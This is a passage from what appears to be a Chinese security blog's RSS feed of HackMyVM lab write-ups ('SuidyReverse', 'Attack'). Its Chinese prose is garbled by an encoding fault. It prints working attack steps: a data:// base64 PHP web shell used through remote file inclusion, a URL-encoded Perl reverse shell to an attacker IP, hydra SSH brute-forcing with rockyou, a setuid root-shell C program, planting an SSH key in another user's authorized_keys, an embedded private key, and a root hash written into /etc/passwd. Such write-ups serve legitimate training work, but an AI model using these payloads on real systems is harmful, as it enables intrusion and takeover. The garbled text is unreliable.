<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.004.png" referrerpolicy="no-referrer"><br>è¯»ä¸€ä¸‹æ–‡ä»¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.005.png" referrerpolicy="no-referrer"><br>æˆ‘æµ‹ï¼Œ38ä¸‡æ¡file parameter is my friend.ï¼Œå·®ç‚¹ç»™æˆ‘å¡å¸æœº<br>å½“æŠŠsimple-backdoor.php ä½œä¸ºFileå‚æ•°æ—¶<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.006.png" referrerpolicy="no-referrer"><br>è€Œä¸”ä¹Ÿå¯ä»¥ä½¿ç”¨cmdå‚æ•°<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.007.png" referrerpolicy="no-referrer"><br><br>å¯èƒ½è¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«<br>å‘ç°å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.008.png" referrerpolicy="no-referrer"><br>å°è¯•è¿œç¨‹åŒ…å«geté©¬<br>å‘ç°è§£æä¸äº†<br>&lt;?php
system($\_GET['cmd']);
echo 'okok');
?&gt;
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.009.png" referrerpolicy="no-referrer"><br><br>å‚è€ƒï¼š<a data-tooltip-position="top" aria-label="https://kv86gpc7nq5.feishu.cn/wiki/OBfkw1zIjiSgWxkGSdbcKUU1n2h#share-ZmKidIwJho6caLxWO4tcT1K3nah" rel="noopener nofollow" class="external-link" href="https://kv86gpc7nq5.feishu.cn/wiki/OBfkw1zIjiSgWxkGSdbcKUU1n2h#share-ZmKidIwJho6caLxWO4tcT1K3nah" target="_blank">3.quick</a><br>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg==
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.010.png" referrerpolicy="no-referrer"><br>æˆåŠŸè§£æ<br>æ‰§è¡Œå‘½ä»¤åå¼¹shell<br>http://192.168.56.9/supersecure/mysuperbackdoor.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnb2snIDs/Pg==&amp;cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.011.png" referrerpolicy="no-referrer"><br><br>è¿›æ¥åå‘ç°åªèƒ½è¿›å…¥suidyç”¨æˆ·çš„ç›®å½•<br>ææƒæ£€æµ‹ä¸€ä¸‹<br>(remote) www-data@suidyrevenge:/home/suidy$ find / -perm -4000 2&gt;/dev/null
/home/suidy/suidyyyyy
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/violent
/usr/bin/newgrp
/usr/bin/chfn 
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
(remote) www-data@suidyrevenge:/home/suidy$ /sbin/getcap / -r 2&gt;/dev/null
/usr/bin/ping = cap\_net\_raw+ep
<br>çœ‹æ¥åº”è¯¥æ˜¯è¦ä»suidyyyyè¿™ä¸ªæ–‡ä»¶ä¸‹æ‰‹<br>ä½†æ˜¯suidyyyè¿™ä¸ªä¸œè¥¿æˆ‘ä»¬æ²¡æƒé™å•Š<br>å…ˆè¯•ä¸€ä¸‹å¯ä¸å¯ä»¥åˆ‡æ¢åˆ°å…¶ä»–ç”¨æˆ·<br>theuser
suidy
mudra
<br>åˆ‡æ¢ä¸äº†ã€‚è‡³å°‘ç®€å•çš„å¯†ç ä¸å¯¹<br>åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å‘ç°murdanote.txt<br>(remote) www-data@suidyrevenge:/var/www/html$ cat murdanote.txt
I always lost my password so Im using
one password from rockyou.txt !

-murda
<br>è¿™å°±æ˜¯è¯´å«æˆ‘ä»¬å»çˆ†ç ´ä»–çš„å¯†ç å•Š<br>hydra -l murda  -P  /usr/share/wordlists/rockyou.txt 192.168.56.9 ssh -vV

[22][ssh] host: 192.168.56.9   login: murda   password: iloveyou
<br>åˆ©ç”¨sshå·¥å…·è¿æ¥ä¸Šå»<br><br>è¿›æ¥æœ‰ä¸ªæç¤º<br>murda@suidyrevenge:~$ cat secret.txt
I know that theuser is here!
I just got the id\_rsa from "violent".
I will put the key in a secure place for theuser!
I hope he find it.
Remember that rockyou.txt is your friend!
<br>æˆ‘çŸ¥é“theuseråœ¨è¿™é‡Œï¼
æˆ‘åˆšåˆšä»â€œviolentâ€é‚£é‡Œæ‹¿åˆ°äº†id\_rsaã€‚
æˆ‘ä¼šæŠŠè¿™ä¸ªå¯†é’¥æ”¾åœ¨ä¸€ä¸ªå®‰å…¨çš„åœ°æ–¹ï¼Œä¾›theuserä½¿ç”¨ï¼
å¸Œæœ›ä»–èƒ½æ‰¾åˆ°å®ƒã€‚
è®°ä½ï¼Œrockyou.txtæ˜¯ä½ çš„æœ‹å‹ï¼
<br>æ„æ€æ˜¯murda è·å–åˆ°äº†violentçš„ç§é’¥ï¼Œæ”¾åˆ°äº†å®‰å…¨çš„åœ°æ–¹ç»™theuserä½¿ç”¨<br>é‚£è‚¯å®šæ˜¯è¦æˆ‘ä»¬çˆ†ç ´theuserç”¨æˆ· è·å–ç§é’¥å•Š<br>çˆ†äº†åŠå¤©æ²¡å‡ºã€‚åˆ©ç”¨é¦–é¡µç»™çš„æç¤ºç”¨differentæˆåŠŸç™»å½•<br>theuser@suidyrevenge:~$ cat user.txt

                                   .     \*\*
                                \*           \*.
                                              ,\*
                                                 \*,
                         ,                         ,\*
                      .,                              \*,
                    /                                    \*
                 ,\*                                        \*,
               /.                                            .\*.
             \*                                                  \*\*
             ,\*                                               ,\*
                \*\*                                          \*.
                   \*\*                                    \*\*.
                     ,\*                                \*\*
                        \*,                          ,\*
                           \*                      \*\*
                             \*,                .\*
                                \*.           \*\*
                                  \*\*      ,\*,
                                     \*\* \*,



HMVbisoususeryay
<br><br>ä¸‹ä¸€æ­¥åº”è¯¥å°±æ˜¯è·å–violentç”¨æˆ·çš„ç§é’¥<br>å‡ ä¸ªåœ°æ–¹æ‰¾äº†ä¸‹æ²¡æ‰¾åˆ°<br>å›æ¥çœ‹suidyyyyå‘ç°å½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œäº†<br>theuser@suidyrevenge:/home/suidy$ ls -la
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash\_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash\_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
<br>çœ‹çœ‹suidyç»™æˆ‘ä»¬çš„æç¤º<br>suidy@suidyrevenge:/home/suidy$ cat note.txt
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
<br>æˆ‘çŸ¥é“theuserä¸åœ¨è¿™é‡Œäº†ï¼Œä½†suidyyyyyç°åœ¨æ›´å®‰å…¨äº†ï¼
rootåƒè¿‡å»ä¸€æ ·è¿è¡Œè„šæœ¬ï¼Œæ€»æ˜¯ç»™suidyyyyyäºŒè¿›åˆ¶æ–‡ä»¶èµ‹äºˆSUIDæƒé™ï¼Œä½†è¿™æ¬¡è¿˜æ£€æŸ¥äº†æ–‡ä»¶çš„å¤§å°ã€‚
æˆ‘ä»¬ä¸å¸Œæœ›â€œtheuserâ€å†å‡ºç°åœ¨è¿™é‡Œï¼
æˆ‘ä»¬ç°åœ¨å¾ˆå®‰å…¨ã€‚
-suidy
<br>è¿™é‡Œæç¤ºæˆ‘ä»¬è¿™ä¸ªæ–‡ä»¶ä¼šæ£€æµ‹æ–‡ä»¶çš„å¤§å°<br>é€†å‘åˆ†æçœ‹çœ‹<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.012.png" referrerpolicy="no-referrer"><br>ç›´æ¥åˆ©ç”¨é¶æœºçš„gccç¼–è¯‘ä¸€ä¸ªä¸ä»–å¤§å°å·®ä¸å¤šçš„ç„¶åæ›¿æ¢æ‰å³å¯<br># include&lt;stdlib.h&gt;
int main(void){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
<br>gcc exp.c -o suidyyyyy
<br>å¾ˆå¥½å¤§å°ä¸€æ¨¡ä¸€æ ·<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.013.png" referrerpolicy="no-referrer"><br>æ›¿æ¢æ‰§è¡Œ<br>è¿™é‡Œææƒä¸äº† å¤šæ‰§è¡Œå‡ æ¬¡<br>root@suidyrevenge:/home/suidy# ./suidyyyyy
root@suidyrevenge:/home/suidy# id
uid=0(root) gid=0(root) groups=0(root),1004(theuser)
<br>root@suidyrevenge:/root# cat script.sh
FILE=/home/suidy/suidyyyyy
if [ -f "$FILE" ]; then
echo ""
        else
   cp /root/suidyyyyy /home/suidy
   chown root:theuser /home/suidy/suidyyyyy
   chmod 770 /home/suidy/suidyyyyy
   chmod +s /home/suidy/suidyyyyy

fi


if [ $(stat -c%s /root/suidyyyyy) -ne $(stat -c%s /home/suidy/suidyyyyy) ]; then
   echo "They're different."
   cp /root/suidyyyyy /home/suidy
   chown root:theuser /home/suidy/suidyyyyy
   chmod 770 /home/suidy/suidyyyyy
   chmod +s /home/suidy/suidyyyyy
else
chmod +s /home/suidy/suidyyyyy
fi

root@suidyrevenge:/root# cat root.txt

                                   .     \*\*
                                \*           \*.
                                              ,\*
                                                 \*,
                         ,                         ,\*
                      .,                              \*,
                    /                                    \*
                 ,\*                                        \*,
               /.                                            .\*.
             \*                                                  \*\*
             ,\*                                               ,\*
                \*\*                                          \*.
                   \*\*                                    \*\*.
                     ,\*                                \*\*
                        \*,                          ,\*
                           \*                      \*\*
                             \*,                .\*
                                \*.           \*\*
                                  \*\*      ,\*,
                                     \*\* \*,


HMVvoilarootlala
<br><br>mvä¸cp<br>mv: mvç§»åŠ¨ä¼šå½±å“SUIDçš„æƒé™æ‰€å±ï¼Œè¿™é¢˜ä¸èƒ½ç”¨mvç§»åŠ¨suidyyyyyï¼Œå› ä¸ºä¼šæŠŠrootçš„suidå˜æˆå½“å‰ç”¨æˆ·çš„suid<br>cpï¼šcpä¸ä¼šå½±å“]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/17.suidyreverse.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/17.SuidyReverse.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/17.SuidyReverse.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[16. attack]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç›®å½•æ‰«æ" data-href="#2.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. æµé‡åŒ…åˆ†æ" data-href="#2.2. æµé‡åŒ…åˆ†æ" href="https://www.c1trus.top/about:blank#2.2._æµé‡åŒ…åˆ†æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. æµé‡åŒ…åˆ†æ</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒ" data-href="#3. ææƒ" href="https://www.c1trus.top/about:blank#3._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒ</a>
<br><a data-tooltip-position="top" aria-label="4. å†ææƒ" data-href="#4. å†ææƒ" href="https://www.c1trus.top/about:blank#4._å†ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. å†ææƒ</a>
<br><a data-tooltip-position="top" aria-label="5. æ‹“å±•" data-href="#5. æ‹“å±•" href="https://www.c1trus.top/about:blank#5._æ‹“å±•" class="internal-link" target="_self" rel="noopener nofollow">5. æ‹“å±•</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Attack
<br>ä½œè€…ä½œè€…ï¼šsml
<br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šcppwå‘½ä»¤ï¼ˆæ›¿æ¢/etc/passwdï¼‰
<br><br>Nmap scan report for 10.16.21.183
Host is up (0.00012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
<br><br>é¦–é¡µ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png" referrerpolicy="no-referrer"><br>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“ï¼Œå­˜åœ¨ä¸€ä¸ªcaptureåå­—çš„æµé‡åŒ…ï¼Œä½†æ˜¯åç¼€ä¸çŸ¥é“æ˜¯ä»€ä¹ˆäº†<br>capture.pcap
capture.pcapng
capture.cap
capture.log
capture.ncap
capture.etl
capture.pkt
capture.trace
capture.zip
capture.7z
capture.rar
capture.tar.gz
<br>urlæ‹¼æ¥å°è¯•ä¸€ä¸‹<br>ç¬¬ä¸€ä¸ªå°±æ˜¯çš„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.002.png" referrerpolicy="no-referrer"><br><br>æµé‡åŒ…å¾ˆç®€å•ä¸€å…±å°±ä¸¤ä¸ªæµ<br>å¯¼å‡ºå¯¹è±¡å¯ä»¥è·å–åˆ°ä¸€å…±å›¾ç‰‡<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.003.png" referrerpolicy="no-referrer"><br>æ‰«æäºŒç»´ç å¯ä»¥è·å–åˆ°ä¸€ä¸ªæ–‡ä»¶<br>http://localhost/jackobattack.txt<br>è®¿é—®è·å–åˆ°ä¸€ä¸ªç§é’¥<br>Hey jackob, you will need this:

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAt1O2ZANL3BPkL32RqWk3ONGDYkw58GyD2rqK0RDRblATgo+9+Vpy
wpavGbvNGF1aph9Mf+Tmn6b95yQ6GiAaDUrtiRJXLR1/27Facslk8grW+/uBFVou4vBLB6
exY/+mbsBZxy54RiKp2WVZ3oKOgQ3ybEWX9BVGp0dRdp16GJmyDVcAMR+g4dc/J0Ee59X8
hKlV6MCmGkTZ1/Bn/CCzwztt3HqTVCK/86cQdzGGYeNDSUKUYYE51Ym00PLb8yhJBelJhR
udo+59dLLdGcyQMiCDbBnO7b/RbhRHUnjuuZHaVmkAGs4FBwahDza1QYMp1Fs1sjbDh0I+
trm4Vci2qQAAA8gBP1jWAT9Y1gAAAAdzc2gtcnNhAAABAQC3U7ZkA0vcE+QvfZGpaTc40Y
NiTDnwbIPauorRENFuUBOCj735WnLClq8Zu80YXVqmH0x/5Oafpv3nJDoaIBoNSu2JElct
HX/bsVpyyWTyCtb7+4EVWi7i8EsHp7Fj/6ZuwFnHLnhGIqnZZVnego6BDfJsRZf0FUanR1
F2nXoYmbINVwAxH6Dh1z8nQR7n1fyEqVXowKYaRNnX8Gf8ILPDO23cepNUIr/zpxB3MYZh
40NJQpRhgTnVibTQ8tvzKEkF6UmFG52j7n10st0ZzJAyIINsGc7tv9FuFEdSeO65kdpWaQ
AazgUHBqEPNrVBgynUWzWyNsOHQj62ubhVyLapAAAAAwEAAQAAAQB79EYmaXQpYemvkp+i
hFmqOT80f4XNYhHlGqwxn8V7aPlIFhjFOLrPh0Lti2WpS7W3DQKUlxi4ahjS6FPAxmPXCQ
qC27vF7WQ+DzSw2CtA3MNvrSYiYc/B8edJTcFLc9f8mmIZovn/sgBV1YlmQbBI4j0/p+6O
QrR69mXGZcPgTSSA73N/eR92Bd5AB4e5PI9Io7Ib/GKUgDtilkGhElJ5EHVq0jVxTWq6lP
WnYm4NIX8Rt3+cOX01ohTDKetbrULrVYqcSPLHLgUjskghP8XqTYwy02LJQoTggHgAKFqt
3M5x5C798R2lHGvTZKkLHeTUzHvcjb+uLun+fFCPSuABAAAAgAVc3cUkXUPGpfzeB7A2CZ
Dq0Vy+auMPGMdQSbYg5GgZhwZzPeGKXWx7a6oVvKvxQ33tGXph6u2Nf9Xz3AIar7vVmoJb
TbpngEMxLcsM1DUT1rORcat+G5g0SVUQRssA8+xT+rxx0n0qnJSjMrxYsnu1FPw8iwCt6g
oLAUKk2RqiAAAAgQDzQ9b9CdPD81PXjOEvW+xgT2r16zarfR+3jZjuf7xEHy7PUIE4mV1r
L3Ap2WRtwEOg+izTfBPJCegDognPWHsqLkgNtPZ4wDwbnfrL//zPNVZkZsknxe6wnZ3gvv
jG0IttS7fPqk+XZ6rwAjYUBkUBCGZlWb5lhSRHQcL3fU1IgQAAAIEAwOyaSNsmJ88xb5xf
+75biKyPhHVAaJtfXnMYo+rsHGIUZIZKmok1em8VTJgGAUs+yJrYF2TvlNmvlv5jrGSNPQ
Tf0wbkfaxG8n2FqtjIpCK222bt5kMZ1uULczCjitOVQpNAFt5mJKeqWUjOLj409luMFKY+
zTtL5/FYdo2LGikAAAANamFja29iQGF0dGFjawECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
<br>åº”è¯¥jackob<br>åˆ©ç”¨ç§é’¥è¿æ¥ä¸Šå»<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.004.png" referrerpolicy="no-referrer"><br>HMVattackstarted
<br><br>çœ‹ä¸‹æç¤º<br>jackob@attack:~$ cat note.txt 
I need to launch the script to start the attack planned by kratos
æˆ‘éœ€è¦å¯åŠ¨è„šæœ¬ä»¥å¼€å§‹ Kratos è®¡åˆ’çš„æ”»å‡»
<br>jackob@attack:~$ ls -la
total 48
drwxr-xr-x 5 jackob jackob 4096 Nov 16 07:09 .
drwxr-xr-x 5 root   root   4096 Jan  7  2021 ..
-rwxrwxr-- 1 kratos kratos 1023 Jan 10  2021 attack.sh
-rw-r--r-- 1 jackob jackob  220 Jan  7  2021 .bash\_logout
-rw-r--r-- 1 jackob jackob 3526 Jan  7  2021 .bashrc
drwx------ 3 jackob jackob 4096 Nov 16 07:09 .config
-rwx--x--x 1 jackob jackob 1920 Jan  7  2021 flag.sh
drwxr-xr-x 3 jackob jackob 4096 Jan  7  2021 .local
-rw-r--r-- 1 jackob jackob   67 Jan  7  2021 note.txt
-rw-r--r-- 1 jackob jackob  807 Jan  7  2021 .profile
drwx------ 2 jackob jackob 4096 Jan  7  2021 .ssh
-rw------- 1 jackob jackob   17 Jan  7  2021 user.txt
<br>å…ˆçœ‹ä¸‹flag.sh<br>é‡Œé¢å°±æ˜¯user.txtå†…å®¹<br>jackob@attack:~$ find / -perm -4000 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
jackob@attack:~$ sudo -l
Matching Defaults entries for jackob on attack:
    !env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jackob may run the following commands on attack:
    (kratos) NOPASSWD: /home/jackob/attack.sh
<br>æ„æ€æ˜¯æˆ‘ä»¬å½“å‰jackobç”¨æˆ·å¯ä»¥ä»¥kratosçš„æƒé™æ‰§è¡Œ/home/jackob/attack.sh<br>jackob@attack:~$ cat attack.sh 
#!/bin/bash
echo "[+] LAUNCHING ATTACK"
the9command="/usr/bin/id"
the2command="/usr/bin/ls"
the4command="/usr/bin/echo"
the3command="/usr/bin/uptime"
theOcommand="/usr/bin/echo"
the1command="/usr/bin/id"
the6Command="/usr/bin/echo"
the7command="/usr/bin/w"
the8command="/usr/bin/echo"
the5command="/usr/bin/id"

echo "[+] NEXT PHASE"
the10command="/usr/bin/id"
the20command="/usr/bin/echo"
the30command="/usr/bin/echo"
the40command="/usr/bin/w"
the50command="/usr/bin/echo"
the60command="/usr/bin/date"
the70command="/usr/bin/uptime"
the85command="/usr/bin/echo"

echo "[+] FINAL PHASE"
$the1command &gt;&gt; /tmp/a
$the2command &gt;&gt; /tmp/a
$the3command &gt;&gt; /tmp/b
$the4command &gt;&gt; /tmp/b
$the5command &gt;&gt; /tmp/c
$the6command &gt;&gt; /tmp/c
$the7command &gt;&gt; /tmp/d
$the8command &gt;&gt; /tmp/d
$the9command &gt;&gt; /tmp/f
$the0command &gt;&gt; /tmp/f
$the10command &gt;&gt; /tmp/g
$the20command &gt;&gt; /tmp/g
$the30command &gt;&gt; /tmp/h
$the40command &gt;&gt; /tmp/h
$the50command &gt;&gt; /tmp/r
$the60command &gt; /tmp/r
$the70command &gt; /tmp/w
$the85command &gt; /tmp/z

echo "[+] DONE"
<br>åœ¨ç”¨æˆ·testeç›®å½•ä¸‹å¯ä»¥è·å–åˆ°ä¸€ä¸ªmysecret.png<br>å¸¸è§çš„å‡ ç§è§£å¯†å‘ç°éƒ½æ²¡æœ‰å•¥ä¸œè¥¿<br>è¿˜æ˜¯æŠŠé‡å¿ƒæ”¾åˆ°è¿™ä¸ªattack.shä¸Š<br>æˆ‘ä»¬ä¿®æ”¹æ‰è¿™ä¸ªattack.shçš„å†…å®¹<br><br>ç›´æ¥æŠŠjackobçš„å…¬é’¥å†™è¿›å»<br>echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3U7ZkA0vcE+QvfZGpaTc40YNiTDnwbIPauorRENFuUBOCj735WnLClq8Zu80YXVqmH0x/5Oafpv3nJDoaIBoNSu2JElctHX/bsVpyyWTyCtb7+4EVWi7i8EsHp7Fj/6ZuwFnHLnhGIqnZZVnego6BDfJsRZf0FUanR1F2nXoYmbINVwAxH6Dh1z8nQR7n1fyEqVXowKYaRNnX8Gf8ILPDO23cepNUIr/zpxB3MYZh40NJQpRhgTnVibTQ8tvzKEkF6UmFG52j7n10st0ZzJAyIINsGc7tv9FuFEdSeO65kdpWaQAazgUHBqEPNrVBgynUWzWyNsOHQj62ubhVyLap jackob@attack" &gt;&gt; /home/kratos/.ssh/authorized\_keys
<br>sudo -u kratos /home/jackob/attack.sh
<br>ç„¶åå°±å¯ä»¥ç”¨jackobçš„ç§é’¥è¿æ¥kratosç”¨æˆ·<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.004.png" referrerpolicy="no-referrer"><br><br>æ£€æµ‹ææƒ<br>kratos@attack:~$ sudo -l
Matching Defaults entries for kratos on attack:
    !env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kratos may run the following commands on attack:
    (root) NOPASSWD: /usr/sbin/cppw
<br>cppwå‘½ä»¤å¯ä»¥ç”¨äºè¦†ç›–/etc/passwd<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.005.png" referrerpolicy="no-referrer"><br>è¿™é‡Œæˆ‘å°¼ç›ç©åäº†ã€‚ã€‚ã€‚<br>ä¸èƒ½çå¤åˆ¶å•Š<br>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
teste:x:1000:1000:teste,,,:/home/teste:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
jackob:x:1001:1001:,,,:/home/jackob:/bin/bash
kratos:x:1002:1002:,,,:/home/kratos:/bin/bash
<br>HMVattackr00t
<br><br>è¿™é‡Œè®²ä¸€ä¸‹<br>/etc/passwdé‡Œé¢çš„rootæ˜¯<br>root:x:0:0:root:/root:/bin/bash<br>å…¶ä¸­x è¡¨ç¤ºè¿™ä¸ªå¯†ç æ²¡æœ‰å­˜å‚¨åœ¨passwdé‡Œé¢ å­˜å‚¨åœ¨/etc/shadowé‡Œé¢<br>æˆ‘ä»¬å°†xæ›¿æ¢æˆæˆ‘ä»¬å·²çŸ¥çš„åŠ å¯†å¯†ç å³å¯<br>ä½†è¿™ä¸ªå¯†ç çš„åŠ å¯†æ–¹å¼åº”è¯¥æ˜¯éœ€è¦ç›¸åŒçš„<br>root:$y$j9T$G45VwieJUJvz8NXVR3/CE0$UVbcsJfoy/tK5mlf59P4255orDTFnpTy6JsIodTjo12:0:0:root:/root:/bin/bash
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/16.-attack.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/16. attack.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/16.%20attack.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[15.Random]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
